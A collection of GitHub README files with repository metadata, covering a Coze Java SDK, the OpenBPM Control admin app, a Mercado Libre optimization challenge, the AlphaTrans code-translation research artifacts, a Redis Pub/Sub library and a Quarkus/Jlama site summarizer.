    CozeAPI coze = new CozeAPI.Builder().auth(new TokenAuth(resp.getAccessToken())).baseURL(cozeAPIBase).build();
    // When the token expires, you can also refresh and re-obtain the token
    resp = oauth.refreshToken(resp.getRefreshToken());
} catch (CozeAuthException e) {
    switch (e.getCode()) {
        case AccessDenied:
            /*
            The user rejected the authorization.
            Developers need to guide the user to open the authorization link again.
            */
            break;
        case ExpiredToken:
            /*
            The token has expired. Developers need to guide the user to open
            the authorization link again.
            */
        default:
            e.printStackTrace();
            break;
    }
} catch (Exception e) {
    e.printStackTrace();
}
```

### Streaming usage

Bot chat and workflow run support running in streaming mode.

chat streaming example:

```java
String token = System.getenv(""COZE_API_TOKEN"");
String botID = System.getenv(""PUBLISHED_BOT_ID"");
String userID = System.getenv(""USER_ID"");

TokenAuth authCli = new TokenAuth(token);

// Init the Coze client through the access_token.
CozeAPI coze = new CozeAPI.Builder()
        .baseURL(System.getenv(""COZE_API_BASE""))
        .auth(authCli)
        .readTimeout(10000)
        .build();;

/*
 * Step one, create chat
 * Call the coze.chat().stream() method to create a chat. The create method is a streaming
 * chat and will return a Flowable ChatEvent. Developers should iterate the iterator to get
 * chat event and handle them.
 * */
ChatReq req = ChatReq.builder()
        .botID(botID)
        .userID(userID)
        .messages(Collections.singletonList(Message.buildUserQuestionText(""What can you do?"")))
        .build();

Flowable<ChatEvent> resp = coze.chat().stream(req);
resp.blockingForEach(event -> {
    if (ChatEventType.CONVERSATION_MESSAGE_DELTA.equals(event.getEvent())) {
        System.out.print(event.getMessage().getContent());
    }
    if (ChatEventType.CONVERSATION_CHAT_COMPLETED.equals(event.getEvent())) {
        System.out.println(""Token usage:"" + event.getChat().getUsage().getTokenCount());
    }
});
```

workflow streaming example:

```java
public void streamRun() {
    // Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);

    // Init the Coze client through the access_token.
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .readTimeout(10000)
            .build();

    String workflowID = System.getenv(""WORKSPACE_ID"");

    // if your workflow need input params, you can send them by map
    Map<String, Object> data = new HashMap<>();
    data.put(""param name"", ""param values"");

    RunWorkflowReq.RunWorkflowReqBuilder builder = RunWorkflowReq.builder();
    builder.workflowID(workflowID).parameters(data);

    Flowable<WorkflowEvent> flowable = coze.workflows().runs().stream(builder.build());
    handleEvent(flowable, coze, workflowID);
}

private void handleEvent(Flowable<WorkflowEvent> events, CozeAPI coze, String workflowID) {
    events.subscribe(event -> {
        switch (event.getEvent()) {
            case MESSAGE:
                System.out.println(""Got message"" + event.getMessage());
                break;
            case ERROR:
                System.out.println(""Got error"" + event.getError());
                break;
            case INTERRUPT:
                handleEvent(coze.workflows().runs().resume(
                        ResumeRunReq.builder()
                                .workflowID(workflowID)
                                .eventID(event.getInterrupt().getInterruptData().getEventID())
                                .resumeData(""your data"")
                                .interruptType(event.getInterrupt().getInterruptData().getType())
                                .build()), coze, workflowID);
                break;
            default:
                break;
        }
    }, Throwable::printStackTrace);
}

```

### Paginator Iterator

The result returned by all list interfaces is a paginator, which supports iteration.

Take the example of listing the bots in a space to explain the three ways to use the paginator iterator:

#### 1. Not using iterators

```java
String token = System.getenv(""COZE_API_TOKEN"");
TokenAuth authCli = new TokenAuth(token);

// Init the Coze client through the access_token.
CozeAPI coze = new CozeAPI.Builder()
        .baseURL(System.getenv(""COZE_API_BASE""))
        .auth(authCli)
        .readTimeout(10000)
        .build();;

Integer pageNum = 1;
String workspaceID = System.getenv(""WORKSPACE_ID"");
ListBotReq listBotReq = ListBotReq.builder()
        .spaceID(workspaceID)
        .pageNum(pageNum)
        .pageSize(10)
        .build();
PageResult<SimpleBot> botList = coze.bots().list(listBotReq);

// the api provides two ways for developers to turn pages for all paging interfaces.
// 1. The first way is to let developers manually call the API to request the next page.
while (botList.getHasMore()) {
    pageNum++;
    listBotReq.setPageNum(pageNum);
    botList = coze.bots().list(listBotReq);
}

// 2. The SDK encapsulates an iterator, which can be used to turn pages backward automatically.

```

#### 2. Iterate over the paginator, getting T

```java
String token = System.getenv(""COZE_API_TOKEN"");
TokenAuth authCli = new TokenAuth(token);

// Init the Coze client through the access_token.
CozeAPI coze = new CozeAPI.Builder()
        .baseURL(System.getenv(""COZE_API_BASE""))
        .auth(authCli)
        .readTimeout(10000)
        .build();;

Integer pageNum = 1;
String workspaceID = System.getenv(""WORKSPACE_ID"");
ListBotReq listBotReq = ListBotReq.builder()
        .spaceID(workspaceID)
        .pageNum(pageNum)
        .pageSize(10)
        .build();
PageResult<SimpleBot> botList = coze.bots().list(listBotReq);

// the api provides two ways for developers to turn pages for all paging interfaces.
// 1. The first way is to let developers manually call the API to request the next page.
Iterator<SimpleBot> iterator = botList.getIterator();
while (iterator.hasNext()) {
    iterator.forEachRemaining(System.out::println);
}

```


",7,1,1,MIT,3,23.0,1.0,5.0,1.0,5.0,1.0,-2.6,106.0
openbpm-platform/openbpm-control,main,"**OpenBPM Control** is a web application that provides administrative functionality for external BPM engines.

**Key Features**
- **Connection Management:** Easily set up connections to various BPM engines and switch between them as needed.
- **Process Browsing:** Navigate through the processes deployed to the engine.
- **Process Deployement:** Deploy a new version of a business process with a convenient diagram preview.
- **Instance Management:** Manage process instances currently running on the BPM engine.
- **User Task Management:** View user tasks with the ability to reassign them.

> [!NOTE]
> Currently, only Camunda 7 is supported. 

OpenBPM Control is built using the open-source [Jmix](https://www.jmix.io) framework.

## Table of Contents

- [Running the Application](#running-the-application)
   - [Docker Image](#docker-image)
   - [Using Sources](#using-sources)
- [Usage](#usage)
   - [Connecting to BPM Engines](#connecting-to-bpm-engines)
   - [Working with Processes](#working-with-processes)
     - [Deploying a Process](#deploying-a-process)
     - [Starting a Process](#starting-a-process)
   - [Managing Process Instances](#managing-process-instances)
   - [User Tasks](#user-tasks)
   - [Incidents](#incidents)
   - [Configuring Users](#configuring-users)
- [License](#license) 


## Running the Application <a name=""running-the-application""></a>

You can run OpenBPM Control using either a Docker image or from source code.

### Docker Image <a name=""docker-image""></a>
This method allows running OpenBPM Control with a pre-built Docker image.

**Prerequisites:**

You must have the following installed:
1. Docker
2. Docker Compose

Instructions can be found [here](docker-compose/README.md).

### Using Sources <a name=""using-sources""></a>
This method allows building and running OpenBPM Control locally with Gradle.

**Prerequisites:**

You must have the following installed:
1. Git
2. Java 21 (JDK and JRE)
3. PostgreSQL

**Instructions:**

1. Clone the repository:
    ```shell
     git clone https://github.com/openbpm-platform/openbpm-control
    ```
2. Configure a PostgreSQL database.
   OpenBPM Control stores data such as connections to BPM engines in the database. 
   OpenBPM Control requires a PostgreSQL database by default:
   - Name: `openbpm-control`
   - Connection username: `root`
   - Connection password: `root`
3. Navigate to the cloned project directory and open a terminal.
4. Run the following command:
   ```shell
    .\gradlew bootRun
   ```
The application is now running at http://localhost:8081 in the browser.

## Usage <a name=""usage""></a>
OpenBPM Control requires authenticated access. An administrative user with the credentials `admin/admin` is provided 
from the start. To add more users, see the [Configuring Users](#configuring-users) section.

### Connecting to BPM Engines <a name=""connecting-to-bpm-engines""></a>
To add a connection to a running BPM engine, follow these steps:

1. Navigate to the **BPM engines** view using the application menu.
2. Click **Create**. 
3. In the **New BPM engine** view, provide the following details:
    - _Name_: a short name for your server where BPM engine is running. (e.g., `Dev stand`).
    - _Base URL_.
3. If the target BPM engine requires authenticated access, set the **Enabled** checkbox in the Authentication group to true.
   You can then configure the credentials needed for this connection.
4. Click the **OK** button to save the connection.

![engine-list-view.png](img/engine-list-view.png)

You can configure as many connections as needed.

In the upper right corner, you can see which engine OpenBPM Control is currently connected to.

![engine-state.png](img/engine-state.png)

To switch to another configured BPM engine, click the **Edit** button next to the engine status badge.

![engine-detail-view.png](img/engine-detail-view.png)

### Working with Processes <a name=""working-with-processes""></a>

To view the business processes deployed on the selected BPM engine, click the **Processes** item in the application menu.
The **Processes** view will open, enabling you to filter and sort deployed processes displayed in the table.
By default, only the latest versions of deployed processes are displayed.

The following actions are also available:
- **Refresh:** reloads process list from the BPM engine.
- **Deploy:** an action to deploy a BPMN 2.0 XML to the BPM engine.
- **Remove:** removes selected deployed processes and associated instances.
- **Activate:** activates suspended process versions and associated instances.
- **Suspend:** suspends active process versions and their associated instances.
- **View:** displays the details of the deployed process such as diagram, BPMN 2.0 XML and more.

![process-list-view.png](img/process-list-view.png)

#### Deploying a Process <a name=""deploying-a-process""></a>
You can deploy a new process or a new version of an existing process using the **Deploy** action available in the **Processes** view.
Clicking the **Deploy** button opens the **New process deployment** view.

![new-process-deployment-view.png](img/new-process-deployment-view.png)

To upload a BPMN 2.0 file, click the **Upload** button and select the process to be deployed.
After uploading, you can preview the diagram of the uploaded process and click the **OK** button to deploy to the BPM engine.

#### Starting a Process <a name=""starting-a-process""></a>

To start a process instance immediately, simply click the **Start** button for the desired process.

To specify process variables prior to starting an instance, follow these steps:

1. Click **View** for the desired process.
2. Add required variables in the **Start process** dialog.
3. Click the **Start** button to start the process.

![start-process-dialog.png](img/start-process-dialog.png)

### Managing Process Instances <a name=""managing-process-instances""></a>

To view process instances stored in the BPM engine, use the **Process instances** item in the application menu.

The **Process instances** view allows you to sort and filter the process instances loaded from the BPM engine. 
By default, only active instances are shown.

![process-instance-list-view.png](img/process-instance-list-view.png)

To view the execution details of a specific process instance, click the **View** button.

In the **Process instance** view, you can view runtime and history data related to this instance, including completed
and current activities, variable values, and more.

The right panel provides actions available for the process instance such as viewing instance information, activating 
or suspending the instance.

![process-instance-detail-view.png](img/process-instance-detail-view.png)

### User Tasks <a name=""user-tasks""></a>

You can view active user tasks by selecting the **User tasks** item in the application menu. The **User tasks** view 
will open, enabling you to filter and sort the active tasks associated with the selected BPM engine. For tasks that are
not suspended, you have the option to complete or reassign them.

![user-task-list-view.png](img/user-task-list-view.png)

### Incidents <a name=""incidents""></a>

You can view all opened incidents for the selected BPM engine by selecting the **Incidents** item in the application menu.
In addition to viewing, you can also increase the number of retries for incidents related to failed jobs and external tasks.

![incident-list-view.png](img/incident-list-view.png)

### Configuring Users <a name=""configuring-users""></a>
OpenBPM Control stores users in the `USER_` table in the configured database.

#### Adding Users <a name=""add-a-user""></a>

To add a new user, follow these steps:
1. Log in to OpenBPM Control with administrator credentials (by default, `admin/admin`).
2. In the menu, go to **Security** -> **Users** and then click the **Create** button.

![user-list-view.png](img/user-list-view.png)

3. In the opened **User** view, fill the required fields:
   - **Username**: should be a unique value
   - **Password** and **Confirm password**
4. Click **OK** to save the user.

![user-detail-view.png](img/user-detail-view.png)

#### User Permissions

Newly created users do not have any permissions and thus cannot log in to the application or use any of its functionality. 
To grant permissions to a user, follow these steps:

1. Select a user in the table and click the **Role assignments** button.
2. Click the **Add** button in the **Resource roles** group.
3. Select the row with the name **Full Access** and click the **Select** button.
4. Click **OK** to save.

![role-assignments-view_1.png](img/role-assignments-view_1.png)

![role-assignments-view_2.png](img/role-assignments-view_2.png)

The user can now log in to OpenBPM Control and use all the functionality.

## License <a name=""license""></a>
OpenBPM Control is an open-source project distributed under the [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0) license. 
",0,0,2,Apache-2.0,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0
mercadolibre/challenge-sbpo-2025,master,"# challenge-sbpo-2025

Welcome to the Mercado Libre First Optimization Challenge repository! This challenge is part of the [LVII Brazilian Symposium on Operations Research (SBPO 2025)](https://sbpo2025.galoa.com.br/sbpo-2025/page/5407-home). For further details, please read the post on Medium ([Portuguese version](https://medium.com/mercadolibre-tech/desafio-mercado-livre-de-otimiza%C3%A7%C3%A3o-3a4009607ee3); [Spanish version](https://medium.com/mercadolibre-tech/primer-desaf%C3%ADo-mercado-libre-de-optimizaci%C3%B3n-e8dad236054c)).
In this repository, you will find the base code for the framework, documentation, and other resources related to the challenge.

## Change Log

- **17-01-2025**: Base framework code, documentation and dataset `A`.

## Challenge Rules and Problem Description

Spanish and Portuguese versions of the challenge rules and problem description can be found in the `docs` directory:

- **Spanish**:
  - [Problem description](docs/es_problem_description.pdf)
  - [Challenge rules](docs/es_challenge_rules.pdf)


- **Portuguese**:
  - [Problem description](docs/pt_problem_description.pdf)
  - [Challenge rules](docs/pt_challenge_rules.pdf)

## Project Structure

- `src/main/java/org/sbpo2025/challenge`
  - `Challenge.java` ‚ü∂ Main Java class for reading an input, solving the challenge, and writing the output.
  - `ChallengeSolver.java` ‚ü∂ Java class responsible for solving the wave order picking problem. Most of the solving logic should be implemented here.
  - `ChallengeSolution.java` ‚ü∂ Java class representing the solution to the wave order picking problem.
- `datasets/` ‚ü∂ Directory containing input instance files.
- `run_challenge.py` ‚ü∂ Python script to compile code, run benchmarks, and evaluate solutions.
- `checker.py` ‚ü∂ Python script for evaluating the feasibility and objective value of solutions.

## Prerequisites

- Java 11
- Maven
- Python 3.8 or higher
- CPLEX 22.11 (optional)
- OR-Tools 4.11 (optional)

## Setup

1. Clone the repository:
    ```sh
    git clone https://github.com/mercadolibre/challenge-sbpo-2025
    ```
2. Set the paths to CPLEX and OR-Tools libraries in `run_challenge.py` if needed, e.g.:
    ```sh
    cplex_path = ""$HOME/CPLEX_Studio2211/opl/bin/arm64_osx/""
    or_tools_path = ""$HOME/Documents/or-tools/build/lib/""
    ```

## Usage

### Running the challenge

To compile the code and run benchmarks, use the following command:
```sh
python run_challenge.py <source_folder> <input_folder> <output_folder>
```
Where `<source_folder>` is the path to the Java source code, more specifically, where the `pom.xml` file is located.

In order to run this script you will need the `timeout` (or `gtimeout` on macOS) command installed. You can install it using `apt-get install coreutils` (or equivalent) on Linux or `brew install coreutils` on macOS.

### Checking solution viability

To check the feasibility and objective value of a solution, use the following command:
```sh
python checker.py <input_file> <solution_file>
```

## Examples

1. Compile and run benchmarks:
    ```sh
    python run_challenge.py src/main/java/org/sbpo2025/challenge src/main/resources/instances output
    ```
   
2. Check solution viability:
    ```sh
    python checker.py src/main/resources/instances/instance_001.txt output/instance_001.txt
    ```
",0,1,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Intelligent-CAT-Lab/AlphaTrans,main,"# AlphaTrans
This repository contains artifacts of AlphaTrans from the paper [""Repository-Level Compositional Code Translation and Validation""](https://arxiv.org/abs/2410.24117).

## Getting Started
We provide a [`Dockerfile`](/Dockerfile) which installs all necessary dependencies to reproduce the results of AlphaTrans. Please download [Docker](https://www.docker.com/), and then execute the following to create a docker image and execute the container in interactive mode:

```
docker build --no-cache -t alphatrans .
docker run -it alphatrans bash
```
> [!NOTE]
> If you are using MacOS with an Apple chip, please consider adding `--platform=linux/amd64` in `docker build`.

Please refer to [Reproduce AlphaTrans Results](#reproduce-alphatrans-results) for instructions on how to reproduce the results of AlphaTrans. If you are interested in translating more projects, please refer to [Translate New Java Projects](#translate-new-java-projects).

## Reproduce AlphaTrans Results
AlphaTrans currently supports prompting OpenAI models (e.g., `gpt-4o-2024-11-20`) and open-source models (e.g., `deepseek-ai/deepseek-coder-33b-instruct`) served by [ollama](https://ollama.com/), [vLLM]() or any other engine which can provide an endpoint. We have created a [`model_configs.yaml`](/configs/model_configs.yaml) file to store necessary model information. Please paste in required model information to start experimenting with AlphaTrans.

### RQ1: Effectiveness of AlphaTrans
For all ten projects, we provide the project skeletons and partial translations. Please execute the following to start translating projects (e.g., `commons-fileupload` project with `gpt-4o-2024-11-20` model and with `temperature=0.0`):

```
bash scripts/get_dependencies.sh _decomposed_tests
bash scripts/generate_test_invocation_map.sh _decomposed_tests
bash scripts/extract_coverage.sh commons-fileupload _decomposed_tests
bash scripts/translate_fragment.sh commons-fileupload 0.0 gpt-4o-2024-11-20
```

> [!NOTE]
> Executing the script `extract_coverage.sh` can take some time. Please be patient.

These scripts will translate the project fragment by fragment in reverse-call graph order and store translations in JSON files along with validation results (e.g., syntactical correctness, GraalVM correctness, test execution correctness, etc.). If you want to create standalone python projects, simply recompose all translations with the following script:

```
bash scripts/recompose.sh commons-fileupload 0.0 gpt-4o-2024-11-20
```

If you want to check the effectiveness of `gpt-4o-2024-11-20` in translating `commons-fileupload`, please run the following script:

```
bash scripts/print_results.sh commons-fileupload 0.0 gpt-4o-2024-11-20 data/schemas_decomposed_tests/translations
```

> [!NOTE]
> Due to probabilistic behavior of models, the results might be slightly different when re-translating projects. You may run the experiment multiple times to adjust for this behavior.

### RQ2: Translation Bugs and Fixes:
Please refer to `data/manually_verified_translations` for four projects we complemented AlphaTrans and achieved 100% test pass. The details regarding our manual investigation is available in the paper.

### RQ3: Impact of Test Decomposition
After translating a project, you can execute the following to analyze the effectiveness of test decomposition and producing the raw data in RQ3 figure:

```
bash scripts/analyze_test_decomposition.sh <model_name> <translation_dir>
```

The `<model_name>` can be `gpt-4o-2024-11-20` or `deepseek-coder-33b-instruct`. Similarly, `translation_dir` can be `data/results` or `data/schemas_decomposed_tests/translations` depending on where your translations are saved.

### RQ4: Impact of Test Coverage
Please first refer to [EvoSuite](https://github.com/EvoSuite/evosuite) and use the tool for test generation on all our subject projects, and store them under `java_projects/cleaned_final_projects_evosuite`. We used the default values provided by the tool to generate tests. Then, please refer to steps in [Translate New Java Projects](#translate-new-java-projects) to translate EvoSuite tests. Note that these tests are no different from normal fragments, and are not treated differently.

After following the steps for decomposition, coverage extraction, and translating of EvoSuite tests, you can execute the following to get the ATP+ and TPR+ values in RQ4:

```
python3 src/postprocessing/atp_tpr_plus.py --project_name=<project_name>
```

If you face any errors, there might be a problem in translating your EvoSuite tests. Please create an issue with the description of your problem.

### RQ5: Ablation Study

#### Impact of Program Transformation
If you want to investigate the effect of program transformation, please simply follow the steps in [Project Reduction, Program Transformation and Test Decomposition](#project-reduction-program-transformation-and-test-decomposition), and only perform the reduction step. You can then use CodeQL for program analysis and schema creation as mentioned in [Translate New Java Projects](#translate-new-java-projects).

#### Choice of LLM
If you want to merge results of two different models, please first move each model result under `data/results`, and then execute the following:

```
bash scripts/merge_results.sh 0.0 deepseek-coder-33b-instruct gpt-4o-2024-11-20
```

This will merge results and create a new directory under `data/results/{$first_model}_{$second_model}_MERGED`. You can then see the results by running:

```
bash scripts/print_results.sh commons-fileupload 0.0 deepseek-coder-33b-instruct_gpt-4o-2024-11-20_MERGED data/results
```

#### Impact of Program Decomposition
If you want to perform file-by-file translation without program decomposition, please run the following scripts:

```
bash scripts/translate_class_by_class.sh <model_name>
bash scripts/validate_class_by_class.sh <model_name>
```

The project name can be either `deepseek-coder-33b-instruct` or `gpt-4o-2024-11-20`.

## Translate New Java Projects
In this section, we discuss how to add more projects and translate with AlphaTrans. Below, we provide the steps for the ten subject projects in our work. If you add a new project, it should be similar to existing ones. For every project, we provide two specific snapshots as shown below:

1. [`original_projects`](/java_projects/original_projects): Original snapshot of the projects cloned from GitHub.
2. [`cleaned_final_projects_decomposed_tests`](/java_projects/cleaned_final_projects_decomposed_tests/): Snapshot of the `original_projects` with third-party libraries removed, overload methods/constructors transformed, and tests decomposed.

You can start experimenting from the second snapshot (`cleaned_final_projects_decomposed_tests`) as project reduction, transformation, and decomposition can potentially take hours. Please refer to [Project Reduction, Program Transformation and Test Decomposition](#project-reduction-program-transformation-and-test-decomposition) for further preprocessing steps.

### 1. CodeQL Database Creation & Static Analysis

AlphaTrans requires [CodeQL CLI](https://docs.github.com/en/code-security/codeql-cli/getting-started-with-the-codeql-cli/setting-up-the-codeql-cli) for database creation and static analysis of projects. We already install CodeQL using Docker. We also clone the [vscode-codeql-starter](https://github.com/github/vscode-codeql-starter) repository required for executing CodeQL queries. Please follow the steps below to create project database and execute queries on [`cleaned_final_projects_decomposed_tests`](/java_projects/cleaned_final_projects_decomposed_tests/):

#### Create CodeQL Project Database
Create project database with CodeQL by executing the following script:
```
bash scripts/create_database.sh _decomposed_tests
```
After successful execution, the databases should be created under `databases/<project_name>_decomposed_tests`.

#### Execute CodeQL Queries
We have already copied all CodeQL files from [`queries`](/queries/) into the `vscode-codeql-starter/codeql-custom-queries-java` directory. Execute the following to run all necessary CodeQL queries:
```
cd vscode-codeql-starter/codeql-custom-queries-java
bash run.sh
```
Once all queries are executed, query outputs will be stored under `data/query_outputs_decomposed_tests`.

### 2. Program Decomposition

Execute the following to decompose programs and create project schemas:
```
bash scripts/create_schema.sh _decomposed_tests
bash scripts/extract_call_graph.sh _decomposed_tests
```
These scripts will properly store project schemas in JSON format under `data/schemas_decomposed_tests`.

### 3. Type Translation
We provide our universal type map under [`data/type_resolution/universal_type_map_final.json`](/data/type_resolution/universal_type_map_final.json). This type map can be directly used, however, if you want to translate types again, please execute the following from the root directory of the repository to perform type translation on the projects.

```
bash scripts/extract_types.sh _decomposed_tests
bash scripts/crawl_type_desc.sh
bash scripts/translate_types.sh <type> <model_name>
```

The `<type>` can be either `simple` or `source_description`. The former prompts the model with vanilla prompt, while the latter prompts the model with source PL type description. The model can be either `deepseek-coder-33b-instruct` or `gpt-4o-2024-11-20`.

### 4. Skeleton Construction
Execute the following from the root directory of the repository to generate skeletons of projects and check their syntactical correctness

```bash
bash scripts/get_dependencies.sh _decomposed_tests
bash scripts/create_skeleton.sh _decomposed_tests
```

This command should create proper skeletons in target language under `data/skeletons/<project_name>`.

### 5. Compositional Translation and Validation

Finally, execute the following from the root directory of the repository to perform compositional translation and validation on the projects.

```bash
bash scripts/generate_test_invocation_map.sh _decomposed_tests
bash scripts/extract_coverage.sh <project_name> _decomposed_tests
bash scripts/translate_fragment.sh <project_name> <temperature> <model>
```

You can use `project_name=commons-fileupload`, `temperature=0.0`, and `model=gpt-4o-2024-11-20` as an example.

## Project Reduction, Program Transformation and Test Decomposition
In this section, we provide the steps on how to get rid of third-party libraries from original projects, transform programs and perform test decomposition.

### 1. Project Reduction

#### Add the Maven JAR Plugin

Run the following script to add the `maven-jar-plugin` to a project for a test jar:
```
bash scripts/add_plugin.sh <project_name>
```

#### Build and Merge Source and Test JARs
Run this script to build the project and merge the source and test JARs:
```
bash scripts/merge_jar.sh <project_name>
```
> [!NOTE]
> If a project uses an older version of Java, please consider changing the `pom.xml` file or use `-Dmaven.compiler.source=1.8 -Dmaven.compiler.target=1.8` flags to override the compiler versions during compilation.

#### Generate a Call Graph

Generate a simple call graph (via JavaCG) of the entire project using the merged JAR:
```
bash scripts/generate_cg.sh <project_name>
```

#### Reduce Project
```
python3 src/preprocessing/reduce_third_party_libs.py <project_name>
```
The project name is the name of a directory from `java_projects/original_projects`. After reduction, a directory of the same name will appear under `java_projects/automated_reduced_projects/`.

### 2. Program Transformation

Before doing program transformation, please follow the steps mentioned in [CodeQL Database Creation and Static Analysis](#1-codeql-database-creation--static-analysis) to properly create databases of reduced projects and generate query outputs. Then, execute the following to perform program transformation on a specific project. The `<project_dir_overload_methods>` and `<project_dir_overload_constructors>` are the directories of projects with overload methods and constructors. You can choose the directory names.

```
bash scripts/program_transformation.sh <project_dir_overload_methods> <project_dir_overload_constructors> <project_name>
```

### 3. Test Decomposition
AlphaTrans performs test decomposition on transformed projects as a step to address the long-call chain problem when executing tests in target language. Please execute the following to first extract executed tests and their coverage, and use this information to decompose tests properly:
```
bash scripts/extract_coverage.sh <project_name> ''
```
Once this executes properly, it should create a directory called `source_test_execution` under [`data`](/data/). Then execute the following to decompose tests:
```
bash scripts/decompose_test.sh
```
After successful execution, this should create the [`cleaned_final_projects_decomposed_tests`](/java_projects/cleaned_final_projects_decomposed_tests/) directory under [`java_projects`](/java_projects/).

> [!NOTE]
> There might be a need to do some small manual changes after test decomposition. For instance removing `@Test(expected = IllegalArgumentException.class)` from test annotation as we do not know ahead of time which decomposed tests throw exception. Please refer to our reference decomposed tests (e.g., [`cleaned_final_projects_decomposed_tests`](/java_projects/cleaned_final_projects_decomposed_tests/)) for specific examples. A project with decomposed tests is considered ok as long as it can be compiled by maven.

## Contact
We look forward to hearing your feedback. Please open an issue for any questions or comments üôè.
",1,0,1,NCSA,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,16876.0
JiHongKim98/redis-extensions,main,"# Redis Extensions <img src=""https://github.com/user-attachments/assets/0f4a3bef-e476-457b-9131-77fb45939c52?s=200&v=4"" height = 100 align = left>

> A lightweight annotation-based Redis Pub/Sub library for simplified subscription handling.

![version 0.0.1](https://img.shields.io/badge/version-0.0.1-red?labelColor=black&style=flat-square) ![minimum_jdk](https://img.shields.io/badge/minimum_jdk-17-white?labelColor=black&style=flat-square)

## Dependency

Ensure you have added the Redis Extensions dependency to your `pom.xml` (Maven) or `build.gradle` (Gradle).

**Maven:**

```xml
<!-- pom.xml -->

<dependency>
    <groupId>io.github.jihongkim98</groupId>
    <artifactId>redis-extensions</artifactId>
    <version>0.0.1</version>
</dependency>
```

**Gradle:**

```groovy
// build.gradle

dependencies {
    implementation 'io.github.jihongkim98:redis-extensions:0.0.1'
}
```

See [maven.org](https://central.sonatype.com/artifact/io.github.jihongkim98/redis-extensions/overview)

## Usage

To use **Redis Extensions** in your Spring project, follow these steps:

### Configure RedisMessageListenerContainer

You must register a `RedisMessageListenerContainer` as a Spring Bean in your configuration class.
This is required to enable Redis Pub/Sub message processing.

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.listener.RedisMessageListenerContainer;

@Configuration
public class RedisConfig {

    @Bean
    public RedisMessageListenerContainer redisMessageListenerContainer(RedisConnectionFactory connectionFactory) {
        RedisMessageListenerContainer container = new RedisMessageListenerContainer();
        container.setConnectionFactory(connectionFactory);
        return container;
    }

    // ...
}
```

### Enable Redis Extensions

Use the `@EnableRedisBroadcast` annotation in your configuration class to activate the Redis Extensions library.

```java
import io.github.jihongkim98.redisextensions.EnableRedisBroadcast;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableRedisBroadcast
public class RedisExtensionConfig {
}
```

### Example Usage

After completing the configuration,
you can define methods annotated with `@RedisBroadcastListener` in your beans to handle Redis Pub/Sub messages.

```java
import io.github.jihongkim98.redisextensions.annotation.RedisBroadcastListener;
import org.springframework.stereotype.Service;

@Service
public class SomeHandler {

    @RedisBroadcastListener(channels = ""channel:example"")
    public void listener(String message) {
        System.out.println(""Received message: "" + message);
    }
}
```

The above example demonstrates how you can use the `@RedisBroadcastListener` annotation to listen to messages published to a specific Redis channel (`channel:example`).

Below is an example of how to **publish messages** using Redis Pub/Sub to test the `SomeHandler` class

```java
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

@Service
public class SomeBroadcastHandler {

    private final StringRedisTemplate redisTemplate;

    public void execute() {
        redisTemplate.convertAndSend(
                ""channel:example"",  // channel name
                ""Hello World!""      // message to be sent
        );
    }
}
```

To test the functionality:

1. Execute the `execute()` method from the `SomeBroadcastHandler` class.
   This method sends a message (`""Hello World!""`) to the Redis channel named `""channel:example""`.
2. If everything is configured correctly, the `listener` method in the `SomeHandler` class will be triggered
   automatically.
3. You should see the following output in the console:
   ```
   Received message: Hello World!
   ```
   This confirms that the message was successfully published and received through the Redis Pub/Sub system.
",1,0,2,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
mariofusco/site-summarizer,main,"# A pure Java LLM-based application

The purpose of this project is demonstrating how [Quarkus](https://quarkus.io/), [Langchain4j](https://docs.langchain4j.dev/) and [Jlama](https://github.com/tjake/Jlama) make straightforward to create a pure Java LLM infused application, where the LLM inference is directly embedded in the same JVM running the application, without the need of any external service. 

[![Watch the video](images/thumbnail.png)](https://www.youtube.com/watch?v=z7l1oGhWI40)
[Watch the video](https://www.youtube.com/watch?v=z7l1oGhWI40)

Out-of-the-box this project uses a [small Llama-3.2 model with 4-bit quantization](https://huggingface.co/tjake/Llama-3.2-1B-Instruct-JQ4). When the application is compiled for the first time the model is automatically downloaded locally by Jlama from the Huggingface repository. However it is possible to replace this model and experimenting with any other one by simply editing the `quarkus.langchain4j.jlama.chat-model.model-name` property in the `application.properties` file.  

## The site summarizer

This project uses a LLM to automatically generate the summarization of a blog post taken from any website. After having compiled and packaged it with `mvn clean package`, the simplest way to use it is launching the jar passing as argument the URL of the web page containing the article that you want to summarize, something like: 

```shell script
java -jar --enable-preview --enable-native-access=ALL-UNNAMED --add-modules jdk.incubator.vector target/quarkus-app/quarkus-run.jar https://www.infoq.com/articles/native-java-quarkus/
```

or use the `summarize.java` script that will automatically handle it all using JBang:

```shell
jbang summarize.java https://www.infoq.com/articles/native-java-quarkus/
```

that will generate an output like the following:

```
$ java -jar --enable-preview --enable-native-access=ALL-UNNAMED --add-modules jdk.incubator.vector target/quarkus-app/quarkus-run.jar https://www.infoq.com/articles/native-java-quarkus/
WARNING: Using incubator modules: jdk.incubator.vector
__  ____  __  _____   ___  __ ____  ______ 
 --/ __ \/ / / / _ | / _ \/ //_/ / / / __/ 
 -/ /_/ / /_/ / __ |/ , _/ ,< / /_/ /\ \   
--\___\_\____/_/ |_/_/|_/_/|_|\____/___/   
2024-11-28 11:01:09,295 INFO  [io.quarkus] (main) site-summarizer 1.0.0-SNAPSHOT on JVM (powered by Quarkus 3.16.4) started in 0.402s. Listening on: http://0.0.0.0:8080
2024-11-28 11:01:09,299 INFO  [io.quarkus] (main) Profile prod activated. 
2024-11-28 11:01:09,300 INFO  [io.quarkus] (main) Installed features: [cdi, langchain4j, langchain4j-jlama, qute, rest, smallrye-context-propagation, smallrye-openapi, vertx]
2024-11-28 11:01:11,006 INFO  [org.mfu.sit.SiteSummarizer] (main) Site crawl took 1701 ms
2024-11-28 11:01:11,010 INFO  [org.mfu.sit.SiteSummarizer] (main) Text extraction took 3 ms
2024-11-28 11:01:11,010 INFO  [org.mfu.sit.SiteSummarizer] (main) Summarizing content 17749 characters long
